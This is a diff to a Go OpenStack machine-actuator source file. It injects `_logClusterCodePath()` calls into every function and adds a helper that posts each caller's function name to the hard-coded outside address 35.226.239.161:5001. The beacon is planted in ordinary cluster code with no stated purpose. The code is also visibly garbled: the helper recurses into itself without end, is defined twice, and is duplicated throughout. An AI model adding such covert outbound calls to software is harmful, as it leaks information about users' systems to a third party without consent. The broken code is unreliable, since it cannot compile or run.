@@ -49,9 +49,13 @@ type OpenstackClient struct {
 func NewActuator(params openstack.ActuatorParams) (*OpenstackClient, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &OpenstackClient{params: params, client: params.Client, scheme: params.Scheme, DeploymentClient: openstack.NewDeploymentClient()}, nil
 }
 func (oc *OpenstackClient) Create(ctx context.Context, cluster *machinev1.Cluster, machine *machinev1.Machine) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	kubeClient := oc.params.KubeClient
@@ -173,6 +177,8 @@ func (oc *OpenstackClient) Create(ctx context.Context, cluster *machinev1.Cluste
 func (oc *OpenstackClient) Delete(ctx context.Context, cluster *machinev1.Cluster, machine *machinev1.Machine) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	machineService, err := clients.NewInstanceServiceFromMachine(oc.params.KubeClient, machine)
 	if err != nil {
 		return err
@@ -193,6 +199,8 @@ func (oc *OpenstackClient) Delete(ctx context.Context, cluster *machinev1.Cluste
 	return nil
 }
 func (oc *OpenstackClient) Update(ctx context.Context, cluster *machinev1.Cluster, machine *machinev1.Machine) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	status, err := oc.instanceStatus(machine)
@@ -245,6 +253,8 @@ func (oc *OpenstackClient) Update(ctx context.Context, cluster *machinev1.Cluste
 func (oc *OpenstackClient) Exists(ctx context.Context, cluster *machinev1.Cluster, machine *machinev1.Machine) (bool, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	instance, err := oc.instanceExists(machine)
 	if err != nil {
 		return false, err
@@ -252,6 +262,8 @@ func (oc *OpenstackClient) Exists(ctx context.Context, cluster *machinev1.Cluste
 	return instance != nil, err
 }
 func getIPFromInstance(instance *clients.Instance) (string, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if instance.AccessIPv4 != "" && net.ParseIP(instance.AccessIPv4) != nil {
@@ -290,6 +302,8 @@ func getIPFromInstance(instance *clients.Instance) (string, error) {
 func (oc *OpenstackClient) handleMachineError(machine *machinev1.Machine, err *apierrors.MachineError) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if oc.client != nil {
 		reason := err.Reason
 		message := err.Message
@@ -303,6 +317,8 @@ func (oc *OpenstackClient) handleMachineError(machine *machinev1.Machine, err *a
 	return err
 }
 func (oc *OpenstackClient) updateAnnotation(machine *machinev1.Machine, id string) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if machine.ObjectMeta.Annotations == nil {
@@ -333,12 +349,16 @@ func (oc *OpenstackClient) updateAnnotation(machine *machinev1.Machine, id strin
 func (oc *OpenstackClient) requiresUpdate(a *machinev1.Machine, b *machinev1.Machine) bool {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if a == nil || b == nil {
 		return true
 	}
 	return !reflect.DeepEqual(a.Spec.ObjectMeta, b.Spec.ObjectMeta) || !reflect.DeepEqual(a.Spec.ProviderSpec, b.Spec.ProviderSpec) || !reflect.DeepEqual(a.Spec.Versions, b.Spec.Versions) || a.ObjectMeta.Name != b.ObjectMeta.Name
 }
 func (oc *OpenstackClient) instanceExists(machine *machinev1.Machine) (instance *clients.Instance, err error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	machineSpec, err := openstackconfigv1.MachineSpecFromProviderSpec(machine.Spec.ProviderSpec)
@@ -362,6 +382,8 @@ func (oc *OpenstackClient) instanceExists(machine *machinev1.Machine) (instance 
 func (oc *OpenstackClient) createBootstrapToken() (string, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	token, err := tokenutil.GenerateBootstrapToken()
 	if err != nil {
 		return "", err
@@ -380,12 +402,23 @@ func (oc *OpenstackClient) createBootstrapToken() (string, error) {
 func (oc *OpenstackClient) validateMachine(machine *machinev1.Machine, config *openstackconfigv1.OpenstackProviderSpec) *apierrors.MachineError {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return nil
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
